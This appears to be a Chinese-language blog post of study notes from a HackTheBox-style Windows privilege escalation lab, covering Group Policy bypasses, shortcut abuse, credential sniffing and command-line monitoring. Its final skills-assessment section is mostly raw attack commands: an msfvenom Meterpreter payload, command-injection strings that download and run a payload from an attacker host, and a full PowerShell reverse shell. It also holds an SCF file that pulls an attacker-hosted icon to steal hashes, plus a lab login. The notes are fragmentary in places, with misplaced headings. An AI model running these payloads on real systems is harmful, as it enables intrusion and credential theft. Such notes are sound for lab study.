<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063739.png" alt="Pasted image 20260322063739" />
<p>可执行 <code>pwn.exe</code> 是从 <code>pwn.c</code> 文件编译的自定义二进制文件，执行时会打开 cmd。</p>
<pre><code class="language-c">#include &lt;stdlib.h&gt;
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}</code></pre>
<p>然后我们可以利用获得的 cmd 权限，将文件从 SMB 共享复制到 pmorgan 的桌面目录。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063831.png" alt="Pasted image 20260322063831" />
<h3>Explorer 的替代方案</h3>
<p>在对文件资源管理器施加严格限制的情况下，可以使用像 <code>Q-Dir</code> 或 <code>Explorer++</code> 这样的替代文件系统编辑器作为变通方法。这些工具可以绕过组策略强制执行的文件夹限制，使用户能够浏览和访问在标准文件资源管理器环境中本应受限的文件和目录。</p>
<p>值得注意的是，之前文件资源管理器无法从 SMB 共享复制文件，原因是存在一些限制。然而，通过利用 <code>Explorer++</code>，以下截图已成功演示了将文件从 <code>\\13.38.95\share</code> 位置复制到属于用户 <code>pmorgan</code> 的桌面的功能。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063901.png" alt="Pasted image 20260322063901" />
<p>由于其速度快、用户友好的界面和便携性，<a href="https://explorerplusplus.com/" target="_blank" rel="noreferrer">Explorer++</a> 被强烈推荐并经常用于此类场合。作为一个可移植应用程序，它可以直接执行而无需安装，因此是绕过组策略设置的文件夹限制的便捷选择。</p>
<h3>备用注册编辑</h3>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063935.png" alt="Pasted image 20260322063935" />
<p>同样，当默认注册表编辑器被组策略阻挡时，可以使用替代的注册表编辑器来绕过标准组策略的限制。<a href="https://sourceforge.net/projects/simpregedit/" target="_blank" rel="noreferrer">Simpleregedit</a>、<a href="https://sourceforge.net/projects/uberregedit/" target="_blank" rel="noreferrer">Uberregedit</a> 和 <a href="https://sourceforge.net/projects/sre/" target="_blank" rel="noreferrer">SmallRegistryEditor</a> 是此类 GUI 工具的例子，它们便于编辑 Windows 注册表而不受组策略阻断的影响。这些工具为管理注册表设置提供了实用且有效的解决方案，适用于此类受限环境。</p>
<h3>修改现有快捷指令文件</h3>
<p>通过修改现有的 Windows 快捷方式并在<code>目标</code>字段设置所需可执行程序的路径，也可以实现对文件夹路径的未授权访问。</p>
<p>以下步骤概述了整个流程：</p>
<p><code>右键点击</code>想要的快捷方式。</p>
<p>选择<code>属性</code> 。</p>
<ol><li><code>Right-click</code> the desired shortcut.</li><li>Select <code>Properties</code>.</li></ol>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322064024.png" alt="Pasted image 20260322064024" />
<p>Within the <code>Target</code> field, modify the path to the intended folder for access. 在<code>目标</code>字段中，修改访问目标文件夹的路径。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322064042.png" alt="Pasted image 20260322064042" />
<p>执行快捷指令，命令键就会生成</p>
<ol><li>Execute the Shortcut and cmd will be spawned</li></ol>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322064055.png" alt="Pasted image 20260322064055" />
<p>如果现有快捷键文件不可用，还有其他方法可以考虑。一种选择是通过 SMB 服务器传输已有的快捷方式文件。或者，我们可以按照 <code>Generating a Malicious .lnk File</code> 标签页下“ 与用户互动”部分提到的，使用 PowerShell 创建一个新的快捷方式文件。这些方法在使用快捷键文件时实现目标提供了灵活性。</p>
<pre><code>xfreerdp /v:10.129.205.244 /u:htb-student /p:HTB_@cademy_stdnt!</code></pre>
<h2>补充技巧</h2>
<h3>与用户进行交互</h3>
<p>用户有时是组织中最薄弱的一环。一个超载的员工在快速工作时，可能在浏览共享硬盘、点击链接或运行文件时，注意到机器上有“异常”。正如本模块中所讨论的，Windows 给我们带来了巨大的攻击面，在枚举本地权限升级向量时需要检查许多事项。当我们用尽所有方法后，可以考虑具体手段，通过监听用户的网络流量/本地命令，或攻击需要用户互动的已知易受攻击服务来窃取凭证。我最喜欢的技巧之一是将恶意文件放置在访问频繁的文件共享周围，试图获取用户密码哈希值，以便以后离线破解。</p>
<h4>流量捕获</h4>
<p>如果安装<code>Wireshark</code>，非特权用户可能能够捕获网络流量，因为默认情况下不启用仅限管理员访问 Npcap 驱动的选项。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322164838.png" alt="Pasted image 20260322164838" />
<p>这里我们可以看到一个粗略示例，如何捕获其他用户在同一输入框时输入的明文 FTP 凭证。虽然可能性不大，但如果 <code>Wireshark</code> 安装在我们降落的设备上，值得尝试流量捕获，看看能捕捉到什么。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322164844.png" alt="Pasted image 20260322164844" />
<p>另外，假设我们的客户将我们置于环境中的攻击机器上。在这种情况下，值得先运行 <code>tcpdump</code> 或 <code>Wireshark</code> 一段时间，看看有哪些类型的流量通过线路传输，以及是否能发现什么有趣的情况。工具网络信用记录可以从我们的攻击设备运行，从实时界面或 pcap 文件中检测密码和哈希值。值得在评估时让该工具在后台运行，或者用 pcap 测试，看看能否提取对权限升级或横向转移有用的凭证。</p>
<h4>进程命令行审计</h4>
<p>进程命令行</p>
<p><strong>进程命令行监控</strong></p>
<p>作为用户获得 shell 时，可能会有计划任务或其他进程在命令行传递凭证。我们可以用下面这个脚本来查找进程命令行。它每两秒捕获进程命令行，并将当前状态与之前的状态进行比较，输出任何差异。</p>
<pre><code>while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}</code></pre>
<p><strong>在目标主机上运行监控脚本</strong> 我们可以将脚本托管在攻击机器上，并在目标主机上执行，具体如下。</p>
<pre><code>[Shell]
Command=2
IconFile=\\10.10.15.137\share\test.ico
[Taskbar]
Command=ToggleDesktop</code></pre>
<h3>信息搜刮</h3>
<pre><code>python3 mremoteng_decrypt.py -s "s1lN9UQqWy2QFv2aKVGFa2YRfFvpObytu04vyCuVQi12M0kyV3Xc0xwAlTz0aSNRiR3Rilf6Xb4XQ="

</code></pre>
<h3>其他技巧</h3>
<h2>技能评估</h2>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.137 LPORT=9919 -f exe -o payload.exe  
  
python3 -m http.server


set lhost 10.10.15.137

127.0.0.1 &amp; powershell -c “Invoke-WebRequest -Uri [http://10.10.15.137:8000/payload.exe](http://10.10.15.137/payload.exe) -OutFile C:\Windows\Temp\payload.exe; Start-Process C:\Windows\Temp\payload.exe”


127.0.0.1 &amp; powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.137',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2&gt;&amp;1 | Out-String );$sendback2=$sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte=[text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


</code></pre>`
    }
  }
];
